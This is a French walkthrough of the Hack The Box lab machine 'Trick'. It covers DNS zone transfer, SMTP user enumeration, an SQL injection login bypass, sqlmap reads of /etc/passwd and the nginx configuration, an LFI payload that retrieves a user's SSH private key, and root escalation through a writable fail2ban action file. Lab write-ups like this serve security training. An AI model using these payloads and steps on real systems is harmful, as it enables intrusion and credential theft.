# Trick


![Trick](/images/Trick/trick.png)

Trick commence par une énumération pour trouver un hôte virtuel. Une injection SQL permet de contourner l'authentification et de lire des fichiers depuis le système. Cette lecture mène à un autre sous-domaine, qui est vulnérable à une LFI. A partir de cette LFI je récupère une clé privée SSH. Pour escalader au root, j'abuserai de `fail2ban`.

## Enumeration
### Nmap

Le scan révèle 4 ports ouverts.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  rustscan -a 10.129.104.218 -- -A
--SNIP--
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61ff293b36bd9dacfbde1f56884cae2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR
|   256 9ecdf2406196ea21a6ce2602af759a78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0=
|   256 7293f91158de34ad12b54b4a7364b970 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm
25/tcp open  smtp?   syn-ack ttl 63
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    syn-ack ttl 63 nginx 1.14.2
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Coming Soon - Start Bootstrap Theme
| http-methods:
|_  Supported Methods: GET HEAD
```


### SMTP - TCP 25

Avec `smtp-user-enum`, je trouve quelques utilisateurs SMTP. Le filtre `grep 252` est présent car c'est le code SMTP confirmant l'existence d'un utilisateur.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  smtp-user-enum 10.129.104.218 25 -m VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt | grep 252
[----] root          252 2.0.0 root
[----] mysql         252 2.0.0 mysql

╭─root@exegol-htb /workspace/Trick
╰─➤  smtp-user-enum 10.129.104.218 25 -m VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.txt | grep 252
[----] BACKUP                     252 2.0.0 BACKUP
[----] MAIL                       252 2.0.0 MAIL
[----] NEWS                       252 2.0.0 NEWS
[----] POSTMASTER                 252 2.0.0 POSTMASTER
[----] ROOT                       252 2.0.0 ROOT
[----] SYS                        252 2.0.0 SYS
[----] bin                        252 2.0.0 bin
[----] daemon                     252 2.0.0 daemon
[----] games                      252 2.0.0 games
[----] lp                         252 2.0.0 lp
[----] mail                       252 2.0.0 mail
[----] man                        252 2.0.0 man
[----] news                       252 2.0.0 news
[----] nobody                     252 2.0.0 nobody
[----] root                       252 2.0.0 root
[----] root                       252 2.0.0 root
[----] root@localhost             252 2.0.0 root@localhost
[----] sync                       252 2.0.0 sync
[----] sys                        252 2.0.0 sys
[----] uucp                       252 2.0.0 uucp

╭─root@exegol-htb /workspace/Trick
╰─➤  smtp-user-enum 10.129.104.218 25 -m VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | grep 252
[----] michael                                        252 2.0.0 michael
[----] mail                                           252 2.0.0 mail
[----] root                                           252 2.0.0 root
```


### DNS - TCP 53
#### Reverse DNS Lookup

Je fais un requête reverse DNS et j'ai le nom de domaine de la machine. Les options `+noall` et `+answer` sont là pour n’afficher que les résultats importants.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  dig -x 10.129.104.218 @10.129.104.218 +noall +answer
218.104.129.10.in-addr.arpa. 604800 IN  PTR     trick.htb.
```


#### Zone Transfert

Je fais ensuite du zone transfert pour afficher les autres enregistrements disponibles.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  dig axfr trick.htb @10.129.104.218 +noall +answer
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
```

J'ajoute tout ça au fichier `/etc/hosts`.
```shell
echo "10.129.104.218 trick.htb root.trick.htb preprod-payroll.trick.htb" | tee -a /etc/hosts
```


### HTTP - TCP 80
#### Site

Le site semble être en pleine création. Il s'agit d'un site static sans aucune fonctionnalité.
![](/images/Trick/Trick-1.png)


#### dirsearch

L’énumération de répertoires ne donne rien d’intéressant.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  dirsearch -u http://10.129.104.218/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://10.129.104.218/

[17:33:52] Scanning:
[17:33:57] 403 -   571B - /assets/
[17:33:57] 301 -   185B - /assets  ->  http://10.129.104.218/assets/
[17:33:59] 301 -   185B - /css  ->  http://10.129.104.218/css/
[17:34:00] 200 -    5KB - /index.html
[17:34:01] 301 -   185B - /js  ->  http://10.129.104.218/js/
[17:34:01] 403 -   571B - /js/
```


#### vhost fuzzing

Je ne trouve aucun autre sous domaine.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  ffuf -u http://trick.htb -H "Host: FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 5480

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://trick.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5480
________________________________________________

:: Progress: [151265/151265] :: Job [1/1] :: 1666 req/sec :: Duration: [0:02:14] :: Errors: 40 ::
```


#### root.trick.htb

Le sous-domaine `root.trick.htb` redirige vers la même page que ce qui se trouve sur le domaine principal.
![](/images/Trick/Trick-2.png)


#### preprod-payroll.trick.htb

Le site nous redirige vers une page de connexion.
![](/images/Trick/Trick-4.png)


## Shell as Michael
### dirsearch

Je trouve quelques fichiers intéressants.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  dirsearch -u http://preprod-payroll.trick.htb/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://preprod-payroll.trick.htb/

[19:03:48] Scanning:
[19:03:53] 200 -     0B - /ajax.php
[19:03:53] 301 -   185B - /assets  ->  http://preprod-payroll.trick.htb/assets/
[19:03:53] 403 -   571B - /assets/
[19:03:55] 301 -   185B - /database  ->  http://preprod-payroll.trick.htb/database/
[19:03:55] 403 -   571B - /database/
[19:03:56] 200 -    2KB - /header.php
[19:03:56] 200 -   486B - /home.php
[19:03:56] 302 -    9KB - /index.php  ->  login.php
[19:03:57] 200 -    5KB - /login.php
[19:03:59] 200 -   149B - /readme.txt
[19:04:00] 200 -    2KB - /users.php
```

La page `users.php` affiche l'utilisateur `Administrator` et son username qui est `Enemigosss`. Cette page est statique.
![](/images/Trick/Trick-6.png)

La page `readme.txt` n'affiche qu'un lien de téléchargement d'une image.
![](/images/Trick/Trick-7.png)

Le lien redirige vers cette photo présente sur la page de connexion.
![](/images/Trick/Trick-8.png)


### SQL Injection

J'intercepte la requête après une tentative de connexion. Je change alors la valeur de champ username par `'` et j'ai une erreur. On dirait bien que je me dirige vers une Injection SQL.
![](/images/Trick/Trick-5.png)

Je confirme la SQL Injection avec le payload basique `admin' or 1=1; -- -`
![](/images/Trick/Trick-9.png)

Ce payload me permet de bypasser l'authentification et d'obtenir une connexion en tant qu'administrateur.
![](/images/Trick/Trick-10.png)

Il n'y a qu'une seul utilisateur.
![](/images/Trick/Trick-11.png)

Le mot de passe est caché. Sûrement avec du CSS avec une propriété `hidden`.
![](/images/Trick/Trick-12.png)

Je trouve le mot de passe dans le code source de la page web.
```
username : Enemigosss
password : SuperGucciRainbowCake
```
![](/images/Trick/Trick-13.png)

Dans la liste des employés se trouve John Smith.
![](/images/Trick/Trick-14.png)

Je teste alors le mot de passe trouvé sur les utilisateurs jusque là recensée mais cela ne donne rien.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  nxc ssh trick.htb -u enemigosss -p SuperGucciRainbowCake
SSH         10.129.104.218  22     trick.htb        [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         10.129.104.218  22     trick.htb        [-] enemigosss:SuperGucciRainbowCake
╭─root@exegol-htb /workspace/Trick
╰─➤  nxc ssh trick.htb -u Enemigosss -p SuperGucciRainbowCake
SSH         10.129.104.218  22     trick.htb        [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         10.129.104.218  22     trick.htb        [-] Enemigosss:SuperGucciRainbowCake
╭─root@exegol-htb /workspace/Trick
╰─➤  nxc ssh trick.htb -u john -p SuperGucciRainbowCake
SSH         10.129.104.218  22     trick.htb        [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         10.129.104.218  22     trick.htb        [-] john:SuperGucciRainbowCake
```


### Read Database

Avec `sqlmap`, je vois que le paramètre `username` est vulnérable à une Time Based Union SQLI, une Boolean-based blind SQLI ainsi qu'une time-based SQLI.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  sqlmap -r trick.req --batch --level=5 --risk=3
--SNIP--
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 602 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin' OR NOT 4171=4171-- ooPa&password=admin

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' OR (SELECT 1092 FROM(SELECT COUNT(*),CONCAT(0x716b707a71,(SELECT (ELT(1092=1092,1))),0x7162706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- rYPn&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1135 FROM (SELECT(SLEEP(5)))SMpk)-- dfHv&password=admin
---
[19:46:29] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:46:29] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[19:46:29] [WARNING] your sqlmap version is outdated

[*] ending @ 19:46:29 /2025-10-01/
```

Je récupère les bases de données en utilisant une Boolean based SQL Injection.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  sqlmap -r trick.req --batch --level=5 --risk=3 --technique=B --dbs
--SNIP--
available databases [2]:
[*] information_schema
[*] payroll_db
```

Je récupère les tables de la base de données `payroll_db`.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  sqlmap -r trick.req --batch --level=5 --risk=3 --technique=B -D payroll_db --tables
--SNIP--
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
```

Je ne trouve que les identifiants de l'administrateur dans la base de données.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  sqlmap -r trick.req --batch --level=5 --risk=3 --technique=B -D payroll_db -T users --dump
--SNIP--
Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type   | address | contact | password              | username   |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1      | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
```


### Read Files with sqlmap

Je peux lire des fichiers avec l'option `-file-read`.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  sqlmap -r trick.req --batch --level=5 --risk=3 -file-read=/etc/hosts
--SNIP--
[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hosts (same file)

[20:06:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[20:06:07] [WARNING] your sqlmap version is outdated

[*] ending @ 20:06:07 /2025-10-01/

╭─root@exegol-htb /workspace/Trick
╰─➤  cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hosts
127.0.0.1 localhost
127.0.1.1 trick
```

Je vois que je peux lire le fichier de configuration principal de `nginx`.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  sqlmap -r trick.req --batch --level=5 --risk=3 -file-read=/etc/nginx/nginx.conf
--SNIP--
[20:08:04] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf' and the remote file '/etc/nginx/nginx.conf' have the same size (1482 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf (same file)

[20:08:04] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[20:08:04] [WARNING] your sqlmap version is outdated

[*] ending @ 20:08:04 /2025-10-01/

╭─root@exegol-htb /workspace/Trick
╰─➤  cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        ##
        # Basic Settings
        ##

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ##
        # SSL Settings
        ##

        ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        ##
        # Logging Settings
        ##

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##

        gzip on;

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}


#mail {
#       # See sample authentication script at:
#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#       # auth_http localhost/auth.php;
#       # pop3_capabilities "TOP" "USER";
#       # imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#       server {
#               listen     localhost:110;
#               protocol   pop3;
#               proxy      on;
#       }
#
#       server {
#               listen     localhost:143;
#               protocol   imap;
#               proxy      on;
#       }
#}
```

Je regarde le fichier de configuration de `nginx` qui est le `/etc/nginx/sites-enabled/default`. J'y découvre la configuration des domaines et sous-domaines déjà recensés mais aussi d'un nouveau sous-domaine : `preprod-marketing.trick.htb`.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  sqlmap -r trick.req --batch --level=5 --risk=3 -file-read=/etc/nginx/sites-enabled/default
-SNIP--
[20:22:04] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default' and the remote file '/etc/nginx/sites-enabled/default' have the same size (1058 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default (same file)

[20:22:04] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[20:22:04] [WARNING] your sqlmap version is outdated

[*] ending @ 20:22:04 /2025-10-01/

╭─root@exegol-htb /workspace/Trick
╰─➤  cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name trick.htb;
        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}


server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```

Il y a un utilisateur `Micheal`.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  sqlmap -r trick.req --batch --level=5 --risk=3 -file-read=/etc/passwd
--SNIP--
[20:27:30] [INFO] retrieved: '2351'
[20:27:30] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (2351 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)

[20:27:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[20:27:30] [WARNING] your sqlmap version is outdated

[*] ending @ 20:27:30 /2025-10-01/

╭─root@exegol-htb /workspace/Trick
╰─➤  cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

Je ne pas lire le contenu des fichiers du répertoire `/home/michael`.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  sqlmap -r trick.req --batch --level=5 --risk=3 -file-read=/home/michael/.ssh/id_rsa
--SNIP--
[20:29:07] [INFO] fetching file: '/home/michael/.ssh/id_rsa'
[20:29:07] [INFO] retrieved: ' '
[20:29:07] [ERROR] no data retrieved
[20:29:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[20:29:07] [WARNING] your sqlmap version is outdated

[*] ending @ 20:29:07 /2025-10-01/
```


### LFI

Il s'agit d'un site de Business.
![](/images/Trick/Trick-15.png)

En cliquant sur les onglets, je vois quelque chose d’intéressant sur l'URL de la page.
![](/images/Trick/Trick-16.png)

Il y a une LFI sur le paramètre `page` en utilisant le payload `....//....//....//etc/passwd`.
![](/images/Trick/Trick-17.png)

Je récupère la clé privée de `michael`.
![](/images/Trick/Trick-18.png)

Je copie la clé depuis le code source pour qu'elle soit dans le bon format.
![](/images/Trick/Trick-19.png)


### SSH

Puis je me connecte par SSH avec cette clé.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  chmod 600 michael.key
╭─root@exegol-htb /workspace/Trick
╰─➤  ssh -i michael.key michael@trick.htb
The authenticity of host 'trick.htb (10.129.104.218)' can't be established.
ED25519 key fingerprint is SHA256:CUKzxire1i5wxTO1zNuBswEtE0u/RyyjZ+v07fOUuYY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'trick.htb' (ED25519) to the list of known hosts.
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
michael@trick:~$ cat user.txt
ed29*******************************
```


## Shell as root
### Fail2ban

Michael est membre du groupe `security`. Il peut aussi redémarrer le service `fail2ban` en tant que root.
```shell
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Cet article de [Juggernaut-sec](https://juggernaut-sec.com/fail2ban-lpe/) explique très bien comment effectuer une escalade de privilèges avec `fail2ban` sur une machine Linux.
```shell
michael@trick:~$ cat /etc/fail2ban/jail.conf
--SNIP--
# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 5
```

Le répertoire `/etc/fail2ban/action.d` est accessible en écriture et en lecture par l'utilisateur `root` ainsi que les membres du groupe `security`.
```shell
michael@trick:~$ ls -la /etc/fail2ban/
total 76
drwxr-xr-x   6 root root      4096 Oct  1 20:54 .
drwxr-xr-x 126 root root     12288 Oct  1 20:33 ..
drwxrwx---   2 root security  4096 Oct  1 20:54 action.d
-rw-r--r--   1 root root      2334 Oct  1 20:54 fail2ban.conf
drwxr-xr-x   2 root root      4096 Oct  1 20:54 fail2ban.d
drwxr-xr-x   3 root root      4096 Oct  1 20:54 filter.d
-rw-r--r--   1 root root     22908 Oct  1 20:54 jail.conf
drwxr-xr-x   2 root root      4096 Oct  1 20:54 jail.d
-rw-r--r--   1 root root       645 Oct  1 20:54 paths-arch.conf
-rw-r--r--   1 root root      2827 Oct  1 20:54 paths-common.conf
-rw-r--r--   1 root root       573 Oct  1 20:54 paths-debian.conf
-rw-r--r--   1 root root       738 Oct  1 20:54 paths-opensuse.conf
michael@trick:~$ ls -la /etc/fail2ban/action.d/
total 288
drwxrwx--- 2 root security  4096 Oct  1 20:54 .
drwxr-xr-x 6 root root      4096 Oct  1 20:54 ..
--SNIP--
-rw-r--r-- 1 root root      1420 Oct  1 20:54 iptables-multiport.conf
```


Je modifie alors le fichier  `/etc/fail2ban/action.d/iptables-multiport.conf` pour y ajouter au paramètre `actionban` l'action que je veux qu'il fasse. Ici je fais une copie du `/bin/bash` et lui donne tous les privilèges ainsi que le bit `SUID`.
![](/images/Trick/Trick-21.png)

Ensuite, je brute force le SSH. Je remarque alors que je ne suis pas banni.
```shell
╭─root@exegol-htb /workspace/Trick
╰─➤  nxc ssh trick.htb -u root -p /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
SSH         10.129.104.218  22     trick.htb        [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         10.129.104.218  22     trick.htb        [-] root:123456
SSH         10.129.104.218  22     trick.htb        [-] root:password
SSH         10.129.104.218  22     trick.htb        [-] root:12345678
SSH         10.129.104.218  22     trick.htb        [-] root:qwerty
SSH         10.129.104.218  22     trick.htb        [-] root:123456789
SSH         10.129.104.218  22     trick.htb        [-] root:12345
SSH         10.129.104.218  22     trick.htb        [-] root:1234
SSH         10.129.104.218  22     trick.htb        [-] root:111111
SSH         10.129.104.218  22     trick.htb        [-] root:1234567
SSH         10.129.104.218  22     trick.htb        [-] root:dragon
```

Mais dans le répertoire `/tmp`, le fichier `z3rodol` est bien créé. Il ne me reste plus qu'a l’exécuter avec l'option `-p` pour obtenir un shell en tant que root.
![](/images/Trick/Trick-22.png)

